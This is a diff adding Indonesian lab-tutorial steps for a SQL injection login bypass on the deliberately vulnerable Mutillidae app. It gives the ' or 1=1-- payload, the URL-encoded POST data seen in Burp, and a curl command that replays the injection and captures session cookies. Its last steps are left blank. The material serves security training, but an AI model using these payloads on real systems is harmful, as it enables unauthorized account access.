@@ -43,6 +43,52 @@ Lesson 6
     ![](/assets/lesson-6/proxy-intercept.png)
     
 ### Section 11: SQL Injection: By-Pass Password Without Username (Obtain Access #1)
+- **Step 1**    : Buka Login/Register
+- **Step 2**    : Ketik `' or 1=1-- ` di kolom **Name** dengan spasi di akhir `-- `
+- **Step 3**    : Klik Login
+    ![](/assets/lesson-5/login2.png)
+- **Step 4**    : Anda akan berhasil login dengan akun Admin karena Admin berada pada urutan paling atas pada database. Dengan kondisi `1=1` maka akan menghasilkan kondisi yang selalu benar dan `-- ` berguna untuk comment pada SQL, karena itu query selanjutnya akan dibatalkan **(AND password='')**.
+    ![](/assets/lesson-5/login2_berhasil.png)
+    - Query yang dihasilkan:
+    ```
+    SELECT * FROM accounts WHERE username='' or 1=1-- ' AND password=''
+    ```
+    - Query yang sebenarnya dikerjakan:
+    ```
+    SELECT * FROM accounts WHERE username='' or 1=1
+    ```
+- **Step 5**    : Lihat data request **POST**
+    - Klik Proxy Tab
+    - Klik HTTP History
+    - Klik baris yang berisi `/mutillidae/index.php?page=login.php`
+    - Klik Request Tab
+    _ Klik Raw Tab
+    - Lihat **POST** Data String        
+        ```
+        username=%27+or+1%3D1--+&password=&login-php-submit-button=Login
+        ```
+        - `%27` adalah petik satu (')
+        - `+` adalah spasi
+        - `%3D` adalah sama dengan (=)
+        ![](/assets/lesson-6/obtain_1.png)
+### Section 12: Simulate CURL SQL Injection: (Obtain Access #1)
+- **Step 1**    : Klik Logout
+- **Step 2**    : Gunakan Curl untuk mekakukan login dengan **POST** data yang didapatkan dengan Burpsuite pada Section 11
+    ```
+    curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "username=%27+or+1%3D1--+&password=&login-php-submit-button=Login" --location "http://10.151.36.64/mutillidae/index.php?page=login.php" > login1.txt
+    ```
+    - menampilkan hasil "Logged In Admin"
+        ```
+        grep "Logged In" login1.txt
+        ```
+    - menampilkan **session cookies** beserta **PHP session ID** (PHPSESSID)
+        ```
+        cat crack_cookies.txt
+        ```
+- **Step 3**    :
+- **Step 4**    :  
+
+    
 
 
 
